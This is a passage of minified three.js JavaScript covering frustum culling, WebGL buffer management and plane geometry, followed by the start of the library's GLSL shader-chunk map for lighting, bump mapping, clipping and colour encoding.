0!==a?a:new mt]}var t=e.prototype;return t.set=function(e,t,n,r,i,a){var o=this.planes;return o[0].copy(e),o[1].copy(t),o[2].copy(n),o[3].copy(r),o[4].copy(i),o[5].copy(a),this},t.clone=function(){return(new this.constructor).copy(this)},t.copy=function(e){for(var t=this.planes,n=0;n<6;n++)t[n].copy(e.planes[n]);return this},t.setFromProjectionMatrix=function(e){var t=this.planes,n=e.elements,r=n[0],i=n[1],a=n[2],o=n[3],s=n[4],l=n[5],c=n[6],u=n[7],d=n[8],p=n[9],h=n[10],f=n[11],A=n[12],m=n[13],v=n[14],g=n[15];return t[0].setComponents(o-r,u-s,f-d,g-A).normalize(),t[1].setComponents(o+r,u+s,f+d,g+A).normalize(),t[2].setComponents(o+i,u+l,f+p,g+m).normalize(),t[3].setComponents(o-i,u-l,f-p,g-m).normalize(),t[4].setComponents(o-a,u-c,f-h,g-v).normalize(),t[5].setComponents(o+a,u+c,f+h,g+v).normalize(),this},t.intersectsObject=function(e){var t=e.geometry;return null===t.boundingSphere&&t.computeBoundingSphere(),jn.copy(t.boundingSphere).applyMatrix4(e.matrixWorld),this.intersectsSphere(jn)},t.intersectsSprite=function(e){return jn.center.set(0,0,0),jn.radius=.7071067811865476,jn.applyMatrix4(e.matrixWorld),this.intersectsSphere(jn)},t.intersectsSphere=function(e){for(var t=this.planes,n=e.center,r=-e.radius,i=0;i<6;i++)if(t[i].distanceToPoint(n)<r)return!1;return!0},t.intersectsBox=function(e){for(var t=this.planes,n=0;n<6;n++){var r=t[n];if(Un.x=0<r.normal.x?e.max.x:e.min.x,Un.y=0<r.normal.y?e.max.y:e.min.y,Un.z=0<r.normal.z?e.max.z:e.min.z,r.distanceToPoint(Un)<0)return!1}return!0},t.containsPoint=function(e){for(var t=this.planes,n=0;n<6;n++)if(t[n].distanceToPoint(e)<0)return!1;return!0},e}();function zn(){var e=null,t=!1,n=null,r=null;function i(t,a){n(t,a),r=e.requestAnimationFrame(i)}return{start:function(){!0!==t&&null!==n&&(r=e.requestAnimationFrame(i),t=!0)},stop:function(){e.cancelAnimationFrame(r),t=!1},setAnimationLoop:function(e){n=e},setContext:function(t){e=t}}}function Hn(e,t){var n=t.isWebGL2,r=new WeakMap;return{get:function(e){return e.isInterleavedBufferAttribute&&(e=e.data),r.get(e)},remove:function(t){t.isInterleavedBufferAttribute&&(t=t.data);var n=r.get(t);n&&(e.deleteBuffer(n.buffer),r.delete(t))},update:function(t,i){if(t.isGLBufferAttribute){var a=r.get(t);(!a||a.version<t.version)&&r.set(t,{buffer:t.buffer,type:t.type,bytesPerElement:t.elementSize,version:t.version})}else{t.isInterleavedBufferAttribute&&(t=t.data);var o,s,l,c,u,d=r.get(t);void 0===d?r.set(t,function(t,n){var r=t.array,i=t.usage,a=e.createBuffer();e.bindBuffer(n,a),e.bufferData(n,r,i),t.onUploadCallback();var o=5126;return r instanceof Float32Array?o=5126:r instanceof Float64Array||(r instanceof Uint16Array?o=5123:r instanceof Int16Array?o=5122:r instanceof Uint32Array?o=5125:r instanceof Int32Array?o=5124:r instanceof Int8Array?o=5120:r instanceof Uint8Array&&(o=5121)),{buffer:a,type:o,bytesPerElement:r.BYTES_PER_ELEMENT,version:t.version}}(t,i)):d.version<t.version&&(o=d.buffer,l=i,c=(s=t).array,u=s.updateRange,e.bindBuffer(l,o),-1===u.count?e.bufferSubData(l,0,c):(n?e.bufferSubData(l,u.offset*c.BYTES_PER_ELEMENT,c,u.offset,u.count):e.bufferSubData(l,u.offset*c.BYTES_PER_ELEMENT,c.subarray(u.offset,u.offset+u.count)),u.count=-1),d.version=t.version)}}}}var Vn=function(e){function t(t,n,r,i){var a;(a=e.call(this)||this).type="PlaneBufferGeometry",a.parameters={width:t,height:n,widthSegments:r,heightSegments:i};for(var o=(t=t||1)/2,s=(n=n||1)/2,l=Math.floor(r)||1,c=Math.floor(i)||1,u=l+1,d=c+1,p=t/l,h=n/c,f=[],A=[],m=[],v=[],g=0;g<d;g++)for(var y=g*h-s,b=0;b<u;b++){var _=b*p-o;A.push(_,-y,0),m.push(0,0,1),v.push(b/l),v.push(1-g/c)}for(var w=0;w<c;w++)for(var C=0;C<l;C++){var x=C+u*w,S=C+u*(w+1),k=C+1+u*(w+1),M=C+1+u*w;f.push(x,S,M),f.push(S,k,M)}return a.setIndex(f),a.setAttribute("position",new qt(A,3)),a.setAttribute("normal",new qt(m,3)),a.setAttribute("uv",new qt(v,2)),a}return te(t,e),t}(sn),Qn={alphamap_fragment:"#ifdef USE_ALPHAMAP\n\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\n#endif",alphamap_pars_fragment:"#ifdef USE_ALPHAMAP\n\tuniform sampler2D alphaMap;\n#endif",alphatest_fragment:"#ifdef ALPHATEST\n\tif ( diffuseColor.a < ALPHATEST ) discard;\n#endif",aomap_fragment:"#ifdef USE_AOMAP\n\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\n\treflectedLight.indirectDiffuse *= ambientOcclusion;\n\t#if defined( USE_ENVMAP ) && defined( STANDARD )\n\t\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\t\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\n\t#endif\n#endif",aomap_pars_fragment:"#ifdef USE_AOMAP\n\tuniform sampler2D aoMap;\n\tuniform float aoMapIntensity;\n#endif",begin_vertex:"vec3 transformed = vec3( position );",beginnormal_vertex:"vec3 objectNormal = vec3( normal );\n#ifdef USE_TANGENT\n\tvec3 objectTangent = vec3( tangent.xyz );\n#endif",bsdfs:"vec2 integrateSpecularBRDF( const in float dotNV, const in float roughness ) {\n\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\n\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\n\tvec4 r = roughness * c0 + c1;\n\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\n\treturn vec2( -1.04, 1.04 ) * a004 + r.zw;\n}\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\n\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\n\tif( cutoffDistance > 0.0 ) {\n\t\tdistanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\n\t}\n\treturn distanceFalloff;\n#else\n\tif( cutoffDistance > 0.0 && decayExponent > 0.0 ) {\n\t\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\n\t}\n\treturn 1.0;\n#endif\n}\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\n\treturn RECIPROCAL_PI * diffuseColor;\n}\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\n\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\n}\nvec3 F_Schlick_RoughnessDependent( const in vec3 F0, const in float dotNV, const in float roughness ) {\n\tfloat fresnel = exp2( ( -5.55473 * dotNV - 6.98316 ) * dotNV );\n\tvec3 Fr = max( vec3( 1.0 - roughness ), F0 ) - F0;\n\treturn Fr * fresnel + F0;\n}\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\treturn 1.0 / ( gl * gv );\n}\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\n\tfloat a2 = pow2( alpha );\n\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\treturn 0.5 / max( gv + gl, EPSILON );\n}\nfloat D_GGX( const in float alpha, const in float dotNH ) {\n\tfloat a2 = pow2( alpha );\n\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\n\treturn RECIPROCAL_PI * a2 / pow2( denom );\n}\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat alpha = pow2( roughness );\n\tvec3 halfDir = normalize( incidentLight.direction + viewDir );\n\tfloat dotNL = saturate( dot( normal, incidentLight.direction ) );\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tfloat dotNH = saturate( dot( normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\n\tfloat D = D_GGX( alpha, dotNH );\n\treturn F * ( G * D );\n}\nvec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {\n\tconst float LUT_SIZE = 64.0;\n\tconst float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;\n\tconst float LUT_BIAS = 0.5 / LUT_SIZE;\n\tfloat dotNV = saturate( dot( N, V ) );\n\tvec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );\n\tuv = uv * LUT_SCALE + LUT_BIAS;\n\treturn uv;\n}\nfloat LTC_ClippedSphereFormFactor( const in vec3 f ) {\n\tfloat l = length( f );\n\treturn max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );\n}\nvec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {\n\tfloat x = dot( v1, v2 );\n\tfloat y = abs( x );\n\tfloat a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;\n\tfloat b = 3.4175940 + ( 4.1616724 + y ) * y;\n\tfloat v = a / b;\n\tfloat theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;\n\treturn cross( v1, v2 ) * theta_sintheta;\n}\nvec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {\n\tvec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];\n\tvec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];\n\tvec3 lightNormal = cross( v1, v2 );\n\tif( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );\n\tvec3 T1, T2;\n\tT1 = normalize( V - N * dot( V, N ) );\n\tT2 = - cross( N, T1 );\n\tmat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );\n\tvec3 coords[ 4 ];\n\tcoords[ 0 ] = mat * ( rectCoords[ 0 ] - P );\n\tcoords[ 1 ] = mat * ( rectCoords[ 1 ] - P );\n\tcoords[ 2 ] = mat * ( rectCoords[ 2 ] - P );\n\tcoords[ 3 ] = mat * ( rectCoords[ 3 ] - P );\n\tcoords[ 0 ] = normalize( coords[ 0 ] );\n\tcoords[ 1 ] = normalize( coords[ 1 ] );\n\tcoords[ 2 ] = normalize( coords[ 2 ] );\n\tcoords[ 3 ] = normalize( coords[ 3 ] );\n\tvec3 vectorFormFactor = vec3( 0.0 );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );\n\tfloat result = LTC_ClippedSphereFormFactor( vectorFormFactor );\n\treturn vec3( result );\n}\nvec3 BRDF_Specular_GGX_Environment( const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float roughness ) {\n\tfloat dotNV = saturate( dot( normal, viewDir ) );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\treturn specularColor * brdf.x + brdf.y;\n}\nvoid BRDF_Specular_Multiscattering_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {\n\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\tvec3 F = F_Schlick_RoughnessDependent( specularColor, dotNV, roughness );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\tvec3 FssEss = F * brdf.x + brdf.y;\n\tfloat Ess = brdf.x + brdf.y;\n\tfloat Ems = 1.0 - Ess;\n\tvec3 Favg = specularColor + ( 1.0 - specularColor ) * 0.047619;\tvec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );\n\tsingleScatter += FssEss;\n\tmultiScatter += Fms * Ems;\n}\nfloat G_BlinnPhong_Implicit( ) {\n\treturn 0.25;\n}\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\n\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\n}\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\n\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\n\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\tfloat G = G_BlinnPhong_Implicit( );\n\tfloat D = D_BlinnPhong( shininess, dotNH );\n\treturn F * ( G * D );\n}\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\n\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\n}\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\n\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\n}\n#if defined( USE_SHEEN )\nfloat D_Charlie(float roughness, float NoH) {\n\tfloat invAlpha = 1.0 / roughness;\n\tfloat cos2h = NoH * NoH;\n\tfloat sin2h = max(1.0 - cos2h, 0.0078125);\treturn (2.0 + invAlpha) * pow(sin2h, invAlpha * 0.5) / (2.0 * PI);\n}\nfloat V_Neubelt(float NoV, float NoL) {\n\treturn saturate(1.0 / (4.0 * (NoL + NoV - NoL * NoV)));\n}\nvec3 BRDF_Specular_Sheen( const in float roughness, const in vec3 L, const in GeometricContext geometry, vec3 specularColor ) {\n\tvec3 N = geometry.normal;\n\tvec3 V = geometry.viewDir;\n\tvec3 H = normalize( V + L );\n\tfloat dotNH = saturate( dot( N, H ) );\n\treturn specularColor * D_Charlie( roughness, dotNH ) * V_Neubelt( dot(N, V), dot(N, L) );\n}\n#endif",bumpmap_pars_fragment:"#ifdef USE_BUMPMAP\n\tuniform sampler2D bumpMap;\n\tuniform float bumpScale;\n\tvec2 dHdxy_fwd() {\n\t\tvec2 dSTdx = dFdx( vUv );\n\t\tvec2 dSTdy = dFdy( vUv );\n\t\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\n\t\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\n\t\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\n\t\treturn vec2( dBx, dBy );\n\t}\n\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\n\t\tvec3 vSigmaX = vec3( dFdx( surf_pos.x ), dFdx( surf_pos.y ), dFdx( surf_pos.z ) );\n\t\tvec3 vSigmaY = vec3( dFdy( surf_pos.x ), dFdy( surf_pos.y ), dFdy( surf_pos.z ) );\n\t\tvec3 vN = surf_norm;\n\t\tvec3 R1 = cross( vSigmaY, vN );\n\t\tvec3 R2 = cross( vN, vSigmaX );\n\t\tfloat fDet = dot( vSigmaX, R1 );\n\t\tfDet *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\t\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\n\t\treturn normalize( abs( fDet ) * surf_norm - vGrad );\n\t}\n#endif",clipping_planes_fragment:"#if NUM_CLIPPING_PLANES > 0\n\tvec4 plane;\n\t#pragma unroll_loop_start\n\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {\n\t\tplane = clippingPlanes[ i ];\n\t\tif ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;\n\t}\n\t#pragma unroll_loop_end\n\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\n\t\tbool clipped = true;\n\t\t#pragma unroll_loop_start\n\t\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {\n\t\t\tplane = clippingPlanes[ i ];\n\t\t\tclipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;\n\t\t}\n\t\t#pragma unroll_loop_end\n\t\tif ( clipped ) discard;\n\t#endif\n#endif",clipping_planes_pars_fragment:"#if NUM_CLIPPING_PLANES > 0\n\tvarying vec3 vClipPosition;\n\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\n#endif",clipping_planes_pars_vertex:"#if NUM_CLIPPING_PLANES > 0\n\tvarying vec3 vClipPosition;\n#endif",clipping_planes_vertex:"#if NUM_CLIPPING_PLANES > 0\n\tvClipPosition = - mvPosition.xyz;\n#endif",color_fragment:"#ifdef USE_COLOR\n\tdiffuseColor.rgb *= vColor;\n#endif",color_pars_fragment:"#ifdef USE_COLOR\n\tvarying vec3 vColor;\n#endif",color_pars_vertex:"#if defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )\n\tvarying vec3 vColor;\n#endif",color_vertex:"#if defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )\n\tvColor = vec3( 1.0 );\n#endif\n#ifdef USE_COLOR\n\tvColor.xyz *= color.xyz;\n#endif\n#ifdef USE_INSTANCING_COLOR\n\tvColor.xyz *= instanceColor.xyz;\n#endif",common:"#define PI 3.141592653589793\n#define PI2 6.283185307179586\n#define PI_HALF 1.5707963267948966\n#define RECIPROCAL_PI 0.3183098861837907\n#define RECIPROCAL_PI2 0.15915494309189535\n#define EPSILON 1e-6\n#ifndef saturate\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#endif\n#define whiteComplement(a) ( 1.0 - saturate( a ) )\nfloat pow2( const in float x ) { return x*x; }\nfloat pow3( const in float x ) { return x*x*x; }\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\nhighp float rand( const in vec2 uv ) {\n\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\n\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\n\treturn fract(sin(sn) * c);\n}\n#ifdef HIGH_PRECISION\n\tfloat precisionSafeLength( vec3 v ) { return length( v ); }\n#else\n\tfloat max3( vec3 v ) { return max( max( v.x, v.y ), v.z ); }\n\tfloat precisionSafeLength( vec3 v ) {\n\t\tfloat maxComponent = max3( abs( v ) );\n\t\treturn length( v / maxComponent ) * maxComponent;\n\t}\n#endif\nstruct IncidentLight {\n\tvec3 color;\n\tvec3 direction;\n\tbool visible;\n};\nstruct ReflectedLight {\n\tvec3 directDiffuse;\n\tvec3 directSpecular;\n\tvec3 indirectDiffuse;\n\tvec3 indirectSpecular;\n};\nstruct GeometricContext {\n\tvec3 position;\n\tvec3 normal;\n\tvec3 viewDir;\n#ifdef CLEARCOAT\n\tvec3 clearcoatNormal;\n#endif\n};\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n}\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\n}\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\tfloat distance = dot( planeNormal, point - pointOnPlane );\n\treturn - distance * planeNormal + point;\n}\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn sign( dot( point - pointOnPlane, planeNormal ) );\n}\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\n}\nmat3 transposeMat3( const in mat3 m ) {\n\tmat3 tmp;\n\ttmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );\n\ttmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );\n\ttmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );\n\treturn tmp;\n}\nfloat linearToRelativeLuminance( const in vec3 color ) {\n\tvec3 weights = vec3( 0.2126, 0.7152, 0.0722 );\n\treturn dot( weights, color.rgb );\n}\nbool isPerspectiveMatrix( mat4 m ) {\n\treturn m[ 2 ][ 3 ] == - 1.0;\n}\nvec2 equirectUv( in vec3 dir ) {\n\tfloat u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;\n\tfloat v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\treturn vec2( u, v );\n}",cube_uv_reflection_fragment:"#ifdef ENVMAP_TYPE_CUBE_UV\n\t#define cubeUV_maxMipLevel 8.0\n\t#define cubeUV_minMipLevel 4.0\n\t#define cubeUV_maxTileSize 256.0\n\t#define cubeUV_minTileSize 16.0\n\tfloat getFace( vec3 direction ) {\n\t\tvec3 absDirection = abs( direction );\n\t\tfloat face = - 1.0;\n\t\tif ( absDirection.x > absDirection.z ) {\n\t\t\tif ( absDirection.x > absDirection.y )\n\t\t\t\tface = direction.x > 0.0 ? 0.0 : 3.0;\n\t\t\telse\n\t\t\t\tface = direction.y > 0.0 ? 1.0 : 4.0;\n\t\t} else {\n\t\t\tif ( absDirection.z > absDirection.y )\n\t\t\t\tface = direction.z > 0.0 ? 2.0 : 5.0;\n\t\t\telse\n\t\t\t\tface = direction.y > 0.0 ? 1.0 : 4.0;\n\t\t}\n\t\treturn face;\n\t}\n\tvec2 getUV( vec3 direction, float face ) {\n\t\tvec2 uv;\n\t\tif ( face == 0.0 ) {\n\t\t\tuv = vec2( direction.z, direction.y ) / abs( direction.x );\n\t\t} else if ( face == 1.0 ) {\n\t\t\tuv = vec2( - direction.x, - direction.z ) / abs( direction.y );\n\t\t} else if ( face == 2.0 ) {\n\t\t\tuv = vec2( - direction.x, direction.y ) / abs( direction.z );\n\t\t} else if ( face == 3.0 ) {\n\t\t\tuv = vec2( - direction.z, direction.y ) / abs( direction.x );\n\t\t} else if ( face == 4.0 ) {\n\t\t\tuv = vec2( - direction.x, direction.z ) / abs( direction.y );\n\t\t} else {\n\t\t\tuv = vec2( direction.x, direction.y ) / abs( direction.z );\n\t\t}\n\t\treturn 0.5 * ( uv + 1.0 );\n\t}\n\tvec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {\n\t\tfloat face = getFace( direction );\n\t\tfloat filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );\n\t\tmipInt = max( mipInt, cubeUV_minMipLevel );\n\t\tfloat faceSize = exp2( mipInt );\n\t\tfloat texelSize = 1.0 / ( 3.0 * cubeUV_maxTileSize );\n\t\tvec2 uv = getUV( direction, face ) * ( faceSize - 1.0 );\n\t\tvec2 f = fract( uv );\n\t\tuv += 0.5 - f;\n\t\tif ( face > 2.0 ) {\n\t\t\tuv.y += faceSize;\n\t\t\tface -= 3.0;\n\t\t}\n\t\tuv.x += face * faceSize;\n\t\tif ( mipInt < cubeUV_maxMipLevel ) {\n\t\t\tuv.y += 2.0 * cubeUV_maxTileSize;\n\t\t}\n\t\tuv.y += filterInt * 2.0 * cubeUV_minTileSize;\n\t\tuv.x += 3.0 * max( 0.0, cubeUV_maxTileSize - 2.0 * faceSize );\n\t\tuv *= texelSize;\n\t\tvec3 tl = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tuv.x += texelSize;\n\t\tvec3 tr = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tuv.y += texelSize;\n\t\tvec3 br = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tuv.x -= texelSize;\n\t\tvec3 bl = envMapTexelToLinear( texture2D( envMap, uv ) ).rgb;\n\t\tvec3 tm = mix( tl, tr, f.x );\n\t\tvec3 bm = mix( bl, br, f.x );\n\t\treturn mix( tm, bm, f.y );\n\t}\n\t#define r0 1.0\n\t#define v0 0.339\n\t#define m0 - 2.0\n\t#define r1 0.8\n\t#define v1 0.276\n\t#define m1 - 1.0\n\t#define r4 0.4\n\t#define v4 0.046\n\t#define m4 2.0\n\t#define r5 0.305\n\t#define v5 0.016\n\t#define m5 3.0\n\t#define r6 0.21\n\t#define v6 0.0038\n\t#define m6 4.0\n\tfloat roughnessToMip( float roughness ) {\n\t\tfloat mip = 0.0;\n\t\tif ( roughness >= r1 ) {\n\t\t\tmip = ( r0 - roughness ) * ( m1 - m0 ) / ( r0 - r1 ) + m0;\n\t\t} else if ( roughness >= r4 ) {\n\t\t\tmip = ( r1 - roughness ) * ( m4 - m1 ) / ( r1 - r4 ) + m1;\n\t\t} else if ( roughness >= r5 ) {\n\t\t\tmip = ( r4 - roughness ) * ( m5 - m4 ) / ( r4 - r5 ) + m4;\n\t\t} else if ( roughness >= r6 ) {\n\t\t\tmip = ( r5 - roughness ) * ( m6 - m5 ) / ( r5 - r6 ) + m5;\n\t\t} else {\n\t\t\tmip = - 2.0 * log2( 1.16 * roughness );\t\t}\n\t\treturn mip;\n\t}\n\tvec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {\n\t\tfloat mip = clamp( roughnessToMip( roughness ), m0, cubeUV_maxMipLevel );\n\t\tfloat mipF = fract( mip );\n\t\tfloat mipInt = floor( mip );\n\t\tvec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );\n\t\tif ( mipF == 0.0 ) {\n\t\t\treturn vec4( color0, 1.0 );\n\t\t} else {\n\t\t\tvec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );\n\t\t\treturn vec4( mix( color0, color1, mipF ), 1.0 );\n\t\t}\n\t}\n#endif",defaultnormal_vertex:"vec3 transformedNormal = objectNormal;\n#ifdef USE_INSTANCING\n\tmat3 m = mat3( instanceMatrix );\n\ttransformedNormal /= vec3( dot( m[ 0 ], m[ 0 ] ), dot( m[ 1 ], m[ 1 ] ), dot( m[ 2 ], m[ 2 ] ) );\n\ttransformedNormal = m * transformedNormal;\n#endif\ntransformedNormal = normalMatrix * transformedNormal;\n#ifdef FLIP_SIDED\n\ttransformedNormal = - transformedNormal;\n#endif\n#ifdef USE_TANGENT\n\tvec3 transformedTangent = ( modelViewMatrix * vec4( objectTangent, 0.0 ) ).xyz;\n\t#ifdef FLIP_SIDED\n\t\ttransformedTangent = - transformedTangent;\n\t#endif\n#endif",displacementmap_pars_vertex:"#ifdef USE_DISPLACEMENTMAP\n\tuniform sampler2D displacementMap;\n\tuniform float displacementScale;\n\tuniform float displacementBias;\n#endif",displacementmap_vertex:"#ifdef USE_DISPLACEMENTMAP\n\ttransformed += normalize( objectNormal ) * ( texture2D( displacementMap, vUv ).x * displacementScale + displacementBias );\n#endif",emissivemap_fragment:"#ifdef USE_EMISSIVEMAP\n\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\n\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\n\ttotalEmissiveRadiance *= emissiveColor.rgb;\n#endif",emissivemap_pars_fragment:"#ifdef USE_EMISSIVEMAP\n\tuniform sampler2D emissiveMap;\n#endif",encodings_fragment:"gl_FragColor = linearToOutputTexel( gl_FragColor );",encodings_pars_fragment:"\nvec4 LinearToLinear( in vec4 value ) {\n\treturn value;\n}\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( gammaFactor ) ), value.a );\n}\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( 1.0 / gammaFactor ) ), value.a );\n}\nvec4 sRGBToLinear( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );\n}\nvec4 LinearTosRGB( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );\n}\nvec4 RGBEToLinear( in vec4 value ) {\n\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\n}\nvec4 LinearToRGBE( in vec4 value ) {\n\tfloat maxComponent = max( max( value.r, value.g ), value.b );\n\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\n\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\n}\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * value.a * maxRange, 1.0 );\n}\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat M = clamp( maxRGB / 